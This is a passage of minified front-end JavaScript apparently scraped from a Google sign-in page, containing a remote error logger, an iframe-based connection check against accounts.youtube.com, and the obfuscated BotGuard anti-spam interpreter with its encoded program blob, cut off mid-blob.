Gj.prototype.get=function(a,b){var c=this.request;c.open("GET",a,!0);c.onreadystatechange=function(){4==c.readyState&&b({status:c.status,text:c.responseText})};c.send()};var Gl=function(a){this.g=a;this.v=this.o();if(null==this.g)throw new Gk("Empty module name");};G=Gl.prototype;G.o=function(){var a=window.location.pathname;return a&&0==a.indexOf("/accounts")?"/accounts/JsRemoteLog":"/JsRemoteLog"};
G.j=function(a,b,c){var d=this.v,e=this.g||"",d=d+"?module="+encodeURIComponent(e);a=a||"";d=d+"&type="+encodeURIComponent(a);b=b||"";d=d+"&msg="+encodeURIComponent(b);c=c||[];for(a=0;a<c.length;a++)d=d+"&arg="+encodeURIComponent(c[a]);try{var f=Math.floor(1E4*Math.random()),d=d+"&r="+String(f)}catch(g){}return d};G.send=function(a,b,c){var d=new Gj;d.parameters={};try{var e=this.j(a,b,c);d.get(e,function(){})}catch(f){}};G.error=function(a,b){this.send("ERROR",a,b)};
G.warn=function(a,b){this.send("WARN",a,b)};G.info=function(a,b){this.send("INFO",a,b)};G.f=function(a){var b=this;return function(){try{return a.apply(null,arguments)}catch(c){throw b.error("Uncatched exception: "+c),c;}}};var Gk=function(){};var Gm=Gm||new Gl("uri"),Gn=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^/?#]*)@)?([\\w\\d\\-\\u0100-\\uffff.%]*)(?::([0-9]+))?)?([^?#]+)?(?:\\?([^#]*))?(?:#(.*))?$"),Go=function(a){return"http"==a.toLowerCase()?80:"https"==a.toLowerCase()?443:null},Gp=function(a,b){var c=b.match(Gn)[1]||null,d,e=b.match(Gn)[3]||null;d=e&&decodeURIComponent(e);e=Number(b.match(Gn)[4]||null)||null;if(!c||!d)return Gm.error("Invalid origin Exception",[String(b)]),!1;e||(e=Go(c));var f=a.match(Gn)[1]||null;if(!f||f.toLowerCase()!=
c.toLowerCase())return!1;c=(c=a.match(Gn)[3]||null)&&decodeURIComponent(c);if(!c||c.toLowerCase()!=d.toLowerCase())return!1;(d=Number(a.match(Gn)[4]||null)||null)||(d=Go(f));return e==d};var Gq=Gq||new Gl("check_connection"),Gr=null,Gs=null,Gt=null,Gu=function(a,b){this.c=a;this.b=b;this.a=!1};G=Gu.prototype;G.i=function(a,b){if(!b)return!1;if(0<=a.indexOf(","))return Gq.error("CheckConnection result contains comma",[a]),!1;var c=b.value;b.value=c?c+","+a:a;return!0};G.h=function(a){return this.i(a,Gs)};G.w=function(a){return this.i(a,Gt)};G.m=function(a){a=a.match("^([^:]+):(\\d*):(\\d?)$");return!a||3>a.length?null:a[1]};
G.u=function(a,b){if(!Gp(this.c,a))return!1;if(this.a||!b)return!0;"accessible"==b?(this.h(a),this.a=!0):this.m(b)==this.b&&(this.w(b)||this.h(a),this.a=!0);return!0};G.s=function(){var a;a=this.c;var b="timestamp",c=String((new Date).getTime());if(0<a.indexOf("#"))throw Object("Unsupported URL Exception: "+a);return a=0<=a.indexOf("?")?a+"&"+encodeURIComponent(b)+"="+encodeURIComponent(c):a+"?"+encodeURIComponent(b)+"="+encodeURIComponent(c)};
G.l=function(){var a=window.document.createElement("iframe"),b=a.style;b.visibility="hidden";b.width="1px";b.height="1px";b.position="absolute";b.top="-100px";a.src=this.s();a.id=this.b;Gr.appendChild(a)};
var Gv=function(a){return function(b){var c=b.origin.toLowerCase();b=b.data;for(var d=a.length,e=0;e<d&&!a[e].u(c,b);e++);}},Gw=function(){if(window.postMessage){var a;a=window.__CHECK_CONNECTION_CONFIG.iframeParentElementId;var b=window.__CHECK_CONNECTION_CONFIG.connectivityElementId,c=window.__CHECK_CONNECTION_CONFIG.newResultElementId;(Gr=document.getElementById(a))?(b&&(Gs=document.getElementById(b)),c&&(Gt=document.getElementById(c)),Gs||Gt?a=!0:(Gq.error("Unable to locate the input element to storeCheckConnection result",
["old id: "+String(b),"new id: "+String(c)]),a=!1)):(Gq.error("Unable to locate the iframe anchor to append connection test iframe",["element id: "+a]),a=!1);if(a){a=window.__CHECK_CONNECTION_CONFIG.domainConfigs;if(!a){if(!window.__CHECK_CONNECTION_CONFIG.iframeUri){Gq.error("Missing iframe URL in old configuration");return}a=[{iframeUri:window.__CHECK_CONNECTION_CONFIG.iframeUri,domainSymbol:"youtube"}]}if(0!=a.length){for(var b=a.length,c=[],d=0;d<b;d++)c.push(new Gu(a[d].iframeUri,a[d].domainSymbol));
Gh(window,"message",Gv(c));for(d=0;d<b;d++)c[d].l()}}}},Gx=function(){if(window.__CHECK_CONNECTION_CONFIG){var a=window.__CHECK_CONNECTION_CONFIG.postMsgSupportElementId;if(window.postMessage){var b=document.getElementById(a);b?b.value="1":Gq.error("Unable to locate the input element to storepostMessage test result",["element id: "+a])}}};G_checkConnectionMain=Gq.f(Gw);G_setPostMessageSupportFlag=Gq.f(Gx);
</script>
  <script>
  window.__CHECK_CONNECTION_CONFIG = {
  newResultElementId: 'checkConnection',
  domainConfigs: [{iframeUri: 'https://accounts.youtube.com/accounts/CheckConnection?pmpo\x3dhttps%3A%2F%2Faccounts.google.com\x26v\x3d1902844531',domainSymbol: 'youtube'}],
  iframeUri: '',
  iframeOrigin: '',
  connectivityElementId: 'dnConn',
  iframeParentElementId: 'cc_iframe_parent',
  postMsgSupportElementId: 'pstMsg',
  msgContent: 'accessible'
  };
  G_setPostMessageSupportFlag();
  G_checkConnectionMain();
</script>
  <script type="text/javascript">/* Anti-spam. Want to say hello? Contact (base64) Ym90Z3VhcmQtY29udGFjdEBnb29nbGUuY29t */(function(){eval('var V=function(d,e,x,c,Q){x=d.split("."),c=O,x[0]in c||!c.execScript||c.execScript("var "+x[0]);for(;x.length&&(Q=x.shift());)x.length||void 0===e?c=c[Q]?c[Q]:c[Q]={}:c[Q]=e},O=this,u=function(d,e,x){return 2>=arguments.length?Array.prototype.slice.call(d,e):Array.prototype.slice.call(d,e,x)},K=function(d,e,x){if(e=typeof d,"object"==e)if(d){if(d instanceof Array)return"array";if(d instanceof Object)return e;if(x=Object.prototype.toString.call(d),"[object Window]"==x)return"object";if("[object Array]"==x||"number"==typeof d.length&&"undefined"!=typeof d.splice&&"undefined"!=typeof d.propertyIsEnumerable&&!d.propertyIsEnumerable("splice"))return"array";if("[object Function]"==x||"undefined"!=typeof d.call&&"undefined"!=typeof d.propertyIsEnumerable&&!d.propertyIsEnumerable("call"))return"function"}else return"null";else if("function"==e&&"undefined"==typeof d.call)return"object";return e},D,q=(new function(){},function(d,e,x,c,Q,F,U,N,p){return N=n,Q=n.prototype,U=Q.D,c=function(){return x()},p=Q.g,F=Q.l,x=function(d,S,B){for(d=c[Q.P],S=d===e,B=0,d=d&&d[Q.P];d&&d!=F&&d!=U&&d!=N&&d!=p&&20>B;)B++,d=d[Q.P];return x[Q.X6+S+!(!d+(B+3>>3))]},c[Q.L]=function(d){x[Q.O]=d},c[Q.L](d),d=c}),X=function(d,e){d.G=[],Y(d,d.I,0),Y(d,d.$,0),Y(d,d.K,0),Y(d,d.X,[]),d.b=true,Y(d,d.B,2048),Y(d,d.GO,d),Y(d,d.C,E(4)),Y(d,d.T,0),Y(d,d.v,{}),Y(d,d.a,[]),Y(d,d.cT,"object"==typeof window?window:O),Y(d,d.H,0),Y(d,d.U,0),Y(d,d.u,[]),Y(d,d.i,d.i),Y(d,110,function(x,d,Q){d=C(x),Q=C(x),Y(x,Q,x.c(Q)*x.c(d))}),Y(d,32,function(x,d,Q,e){d=C(x),Q=C(x),e=C(x),Y(x,e,x.c(d)>>Q)}),Y(d,22,function(x,d,Q,e){d=C(x),Q=C(x),e=C(x),x.c(d)[x.c(Q)]=x.c(e)}),Y(d,28,function(x,d,Q,e,U,N,p,b,S,B){if(d=C(x),Q=T(x),e="",void 0!=x.G[x.R])for(U=x.c(x.R),p=U.length,N=0;Q--;)N=(N+T(x))%p,e+=U[N];else{for(e=Array(Q),U=0;U<Q;U++)e[U]=C(x);for(Q=[],N=U=0;U<e.length;)p=e[U++],128>p?Q[N++]=String.fromCharCode(p):191<p&&224>p?(b=e[U++],Q[N++]=String.fromCharCode((p&31)<<6|b&63)):239<p&&365>p?(b=e[U++],S=e[U++],B=e[U++],p=((p&7)<<18|(b&63)<<12|(S&63)<<6|B&63)-65536,Q[N++]=String.fromCharCode(55296+(p>>10)),Q[N++]=String.fromCharCode(56320+(p&1023))):(b=e[U++],S=e[U++],Q[N++]=String.fromCharCode((p&15)<<12|(b&63)<<6|S&63));e=Q.join("")}Y(x,d,e)}),Y(d,46,function(d,c,e,F,U,N){if(c=C(d),e=C(d),F=C(d),U=C(d),c=d.c(c),e=d.c(e),F=d.c(F),d=d.c(U),"object"==K(c)){for(N in U=[],c)U.push(N);c=U}for(U=0,N=c.length;U<N;U+=F)e(c.slice(U,U+F),d)}),Y(d,84,function(d,c){c=l(d),Y(d,c.S,c.o.apply(c.M,c.s))}),Y(d,60,function(d,c,e,F){c=C(d),e=C(d),F=C(d),e=d.c(e),c=d.c(c),Y(d,F,c[e])}),Y(d,24,function(d,c,e,F){c=C(d),e=C(d),F=d.c(C(d)),e=d.c(e),Y(d,c,A(d,e,F))}),Y(d,96,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,""+d.c(e))}),Y(d,72,function(){}),Y(d,57,function(d,e){e=C(d),d=d.c(e),d[0].removeEventListener(d[1],d[2],false)}),Y(d,126,function(){}),Y(d,2,function(d,e,Q,F){if(e=d.A.pop()){for(Q=C(d);0<Q;Q--)F=C(d),e[F]=d.G[F];e[d.X]=d.G[d.X],d.G=e}else Y(d,d.I,d.N.length)}),Y(d,81,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,d.c(Q)-d.c(e))}),Y(d,93,function(d){J(d,3)}),Y(d,67,function(d,e,Q,F,U,N,p){e=l(d),U=e.o,F=e.M,Q=e.s,p=Q.length,0==p?N=new F[U]:1==p?N=new F[U](Q[0]):2==p?N=new F[U](Q[0],Q[1]):3==p?N=new F[U](Q[0],Q[1],Q[2]):4==p?N=new F[U](Q[0],Q[1],Q[2],Q[3]):d.g(d.m),Y(d,e.S,N)}),Y(d,20,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,d.c(Q)%d.c(e))}),Y(d,37,function(d,e,Q,F,U){for(e=C(d),Q=T(d),F=Array(Q),U=0;U<Q;U++)F[U]=C(d);Y(d,e,F)}),Y(d,87,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),Y(d,F,(d.c(e)in d.c(Q))+0)}),Y(d,99,function(d){G(d,2)}),Y(d,79,function(d){J(d,7)}),Y(d,112,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,function(d){return eval(d)}(d.c(e)))}),Y(d,62,function(d,e,Q){e=C(d),Q=C(d),0!=d.c(e)&&Y(d,d.I,d.c(Q))}),Y(d,50,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),Y(d,F,d.c(e)<<Q)}),Y(d,26,function(d){G(d,4)}),Y(d,40,function(d){z(d,2)}),Y(d,108,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),Y(d,F,d.c(e)||d.c(Q))}),Y(d,66,function(d){J(d,4)}),Y(d,114,function(d){J(d,0)}),Y(d,21,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),d.c(e)>d.c(Q)&&Y(d,F,d.c(F)+1)}),Y(d,80,function(d,e,Q){e=C(d),Q=C(d),Y(d,Q,d.c(Q)+d.c(e))}),Y(d,59,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),d.c(e)==d.c(Q)&&Y(d,F,d.c(F)+1)}),Y(d,52,function(d){z(d,4)}),Y(d,65,function(d,e,Q,F,U){e=C(d),Q=C(d),F=C(d),e=d.c(e),U=d.c(C(d)),Q=d.c(Q),F=d.c(F),0!==e&&(F=A(d,F,U,e),e.addEventListener(Q,F,false),Y(d,d.H,[e,Q,F]))}),Y(d,73,function(d,e,Q){e=C(d),Q=C(d),e=d.G[e]&&d.c(e),Y(d,Q,e)}),Y(d,95,function(d){G(d,1)}),Y(d,88,function(){}),Y(d,12,function(d,e,Q){e=C(d),Q=C(d),e=d.c(e),Y(d,Q,K(e))}),Y(d,51,function(d,e){e=d.c(C(d)),M(d,e)}),Y(d,105,function(d){z(d,1)}),Y(d,9,function(d,e,Q,F){e=C(d),Q=C(d),F=C(d),Y(d,F,d.c(e)|d.c(Q))}),w(),e&&"!"==e.charAt(0)?d.w=e:(d.N=window.atob?g(window.atob(e)):null,d.N&&d.N.length?(d.A=[],d.l()):d.g(d.V))},r=function(d,e,x,c){if(8192>=d.length)return String.fromCharCode.apply(null,d);for(x=0,e="";x<d.length;x+=8192)c=u(d,x,x+8192),e+=String.fromCharCode.apply(null,c);return e},f=function(d,e,x,c){return x=d.c(d.I),d.N&&x<d.N.length?(Y(d,d.I,d.N.length),M(d,e)):Y(d,d.I,e),c=d.l(),Y(d,d.I,x),c},Y=function(d,e,x){if(e==d.I||e==d.$)if(d.G[e])d.G[e][d.L](x);else d.G[e]=P(d,x);else if(e!=d.a&&e!=d.C&&e!=d.X||!d.G[e])d.G[e]=q(x,d.c);e==d.U&&(d.J=void 0,Y(d,d.I,d.c(d.I)+4))},w=function(d){for(d=0;64>d;++d);},I=function(d,e,x,c,Q){for(e=[],c=x=0;c<d.length;c++)Q=d.charCodeAt(c),128>Q?e[x++]=Q:(2048>Q?e[x++]=Q>>6|192:(55296==(Q&64512)&&c+1<d.length&&56320==(d.charCodeAt(c+1)&64512)?(Q=65536+((Q&1023)<<10)+(d.charCodeAt(++c)&1023),e[x++]=Q>>18|240,e[x++]=Q>>12&63|128):e[x++]=Q>>12|224,e[x++]=Q>>6&63|128),e[x++]=Q&63|128);return e},n=function(d){try{X(this,d)}catch(e){R(this,e)}},v=(n.prototype.c=function(d,e){if(e=this.G[d],void 0===e)throw this.g(this.Z,0,d),this.j;return e()},function(d,e,x,c,Q,F){for(Q=d.c(e),e=e==d.C?function(e,x,c,F){if(x=Q.length,c=x-4>>3,Q.iD!=c){Q.iD=c,c=(c<<3)-4,F=[0,0,0,d.c(d.T)];try{Q.qt=L(h(Q,c),h(Q,c+4),F)}catch(S){throw S;}}Q.push(Q.qt[x&7]^e)}:function(d){Q.push(d)},c&&e(c&255),F=0,c=x.length;F<c;F++)e(x[F])}),R=(D=n.prototype,D.GO=249,function(d,e){d.w=("E:"+e.message+":"+e.stack).slice(0,2048)}),T=function(d,e){return e=C(d),e&128&&(e=e&127|C(d)<<7),e},h=function(d,e){return d[e]<<24|d[e+1]<<16|d[e+2]<<8|d[e+3]},l=(D.$=173,D.Nt=15,D.cT=145,function(d,e,x,c,Q,F){for(e={},x=C(d),e.S=C(d),e.s=[],c=C(d)-1,Q=C(d),F=0;F<c;F++)e.s.push(C(d));for(e.o=d.c(x),e.M=d.c(Q);c--;)e.s[c]=d.c(e.s[c]);return e}),P=(D.O=36,D.H=219,D.V=17,D.Y=233,function(d,e,x,c){return c=function(){return e},x=function(){return c()},x[d.L]=function(d){e=d},x}),m=(D.u=129,function(d,e,x,c){for(c=e-1,x=[];0<=c;c--)x[e-1-c]=d>>8*c&255;return x}),E=(D.v=134,D.gX=153,D.kU=10,D.K=170,D.B=191,D.U=176,n.prototype.$U=function(d,e,x,c){if(3==d.length){for(x=0;3>x;x++)e[x]+=d[x];for(x=0,c=[13,8,13,12,16,5,3,10,15];9>x;x++)e[3](e,x%3,c[x])}},D.I=149,D.P="caller",function(d,e){for(e=Array(d);d--;)e[d]=255*Math.random()|0;return e}),L=(D.C=237,function(d,e,x,c){try{for(c=0;79669387488!=c;)d+=(e<<4^e>>>5)+e^c+x[c&3],c+=2489668359,e+=(d<<4^d>>>5)+d^c+x[c>>>11&3];return[d>>>24,d>>16&255,d>>8&255,d&255,e>>>24,e>>16&255,e>>8&255,e&255]}catch(Q){throw Q;}}),A=(D.X=155,function(d,e,x,c){return function(){if(!c||d.b)return Y(d,d.IW,arguments),Y(d,d.v,x),f(d,e)}}),M=(D.Z=30,D.L="toString",D.IW=217,D.j={},D.T=133,D.W=33,D.a=236,n.prototype.g=function(d,e,x,c){c=this.c(this.$),d=[d,c>>8&255,c&255],void 0!=x&&d.push(x),0==this.c(this.X).length&&(this.G[this.X]=void 0,Y(this,this.X,d)),x="",e&&(e.message&&(x+=e.message),e.stack&&(x+=":"+e.stack)),e=this.c(this.B),3<e&&(x=x.slice(0,e-3),e-=x.length+3,x=I(x.replace(/\\r\\n/g,"\\n")),v(this,this.C,m(x.length,2).concat(x),this.aW)),Y(this,this.B,e)},D.h=21,D.CE=false,function(d,e){d.A.push(d.G.slice()),d.G[d.I]=void 0,Y(d,d.I,e)}),C=(D.X6=34,function(d,e,x){if(e=d.c(d.I),!(e in d.N))throw d.g(d.F),d.j;return void 0==d.J&&(d.J=h(d.N,e-4),d.f=void 0),d.f!=e>>3&&(d.f=e>>3,x=[0,0,0,d.c(d.U)],d.rX=L(d.J,d.f,x)),Y(d,d.I,e+1),d.N[e]^d.rX[e%8]}),g=(D.i=143,n.prototype.nE=function(d,e){e.push(d[0]<<24|d[1]<<16|d[2]<<8|d[3]),e.push(d[4]<<24|d[5]<<16|d[6]<<8|d[7]),e.push(d[8]<<24|d[9]<<16|d[10]<<8|d[11])},n.prototype.Em=function(d,e,x,c){try{c=d[(e+2)%3],d[e]=d[e]-d[(e+1)%3]-c^(1==e?c<<x:c>>>x)}catch(Q){throw Q;}},D.F=31,D.aW=12,D.m=22,D.R=187,D=n.prototype,function(d,e,x,c,Q){for(e=[],c=x=0;c<d.length;c++){for(Q=d.charCodeAt(c);255<Q;)e[x++]=Q&255,Q>>=8;e[x++]=Q}return e}),J=(D.sm=function(d){return(d=window.performance)&&d.now?function(){return d.now()|0}:function(){return+new Date}}(),function(d,e,x,c,Q,F){c=e&3,x=e&4,Q=C(d),F=C(d),Q=d.c(Q),x&&(Q=I((""+Q).replace(/\\r\\n/g,"\\n"))),c&&v(d,F,m(Q.length,2)),v(d,F,Q)}),z=function(d,e,x,c){for(x=C(d),c=0;0<e;e--)c=c<<8|C(d);Y(d,x,c)},G=(D.BT=function(d,e){return e=this.D(),d&&d(e),e},function(d,e,x,c){x=C(d),c=C(d),v(d,c,m(d.c(x),e))});D.LE=function(d,e,x){return e^=e<<13,e^=e>>17,(e=(e^e<<5)&x)||(e=1),d^e},D.D=function(d,e,x,c,Q,F,U,N,p,b){if(this.w)return this.w;try{if(this.b=false,e=this.c(this.a).length,x=this.c(this.C).length,c=this.c(this.B),this.G[this.Y]&&f(this,this.c(this.Y)),Q=this.c(this.X),0<Q.length&&v(this,this.a,m(Q.length,2).concat(Q),this.Nt),F=this.c(this.K)&511,F-=this.c(this.a).length+5,U=this.c(this.C),4<U.length&&(F-=U.length+3),0<F&&v(this,this.a,m(F,2).concat(E(F)),this.kU),4<U.length&&v(this,this.a,m(U.length,2).concat(U),this.gX),N=E(2).concat(this.c(this.a)),N[1]=N[0]^3,p=window.btoa?window.btoa(r(N)).replace(/\\+/g,"-").replace(/\\//g,"_").replace(/=/g,""):void 0,p)p="!"+p;else for(Q=0,p="";Q<N.length;Q++)b=N[Q][this.L](16),1==b.length&&(b="0"+b),p+=b;this.c(this.a).length=e,this.c(this.C).length=x,Y(this,this.B,c),d=p,this.b=true}catch(S){R(this,S),d=this.w}return d},D.PT=function(d,e,x,c,Q,F){for(x=[],F=c=0;F<d.length;F++)for(Q=Q<<e|d[F],c+=e;7<c;)c-=8,x.push(Q>>c&255);return x},D.l=function(d,e,x,c,Q,F){try{for(c=0,e=5001,x=void 0,d=this.N.length;(--e||this.CE)&&(c=this.c(this.I))<d;)try{Y(this,this.$,c),Q=C(this),(x=this.c(Q))&&x.call?x(this):this.g(this.h,0,Q)}catch(U){U!=this.j&&(F=this.c(this.i),F!=this.i?(Y(this,F,U),Y(this,this.i,this.i)):this.g(this.m,U))}e||this.g(this.W)}catch(U){try{this.g(this.m,U)}catch(N){R(this,N)}}return this.c(this.v)},D.wX=function(d,e,x,c,Q){for(Q=c=0;Q<d.length;Q++)c+=d.charCodeAt(Q),c+=c<<10,c^=c>>6;return c+=c<<3,c^=c>>11,d=c+(c<<15)>>>0,c=new Number(d&(1<<e)-1),c[0]=(d>>>e)%x,c};try{window.addEventListener("unload",function(){},false)}catch(d){}V("botguard.bg",n),V("botguard.bg.prototype.invoke",n.prototype.BT);')})()</script>
  <script type="text/javascript">
  document.bg = new botguard.bg('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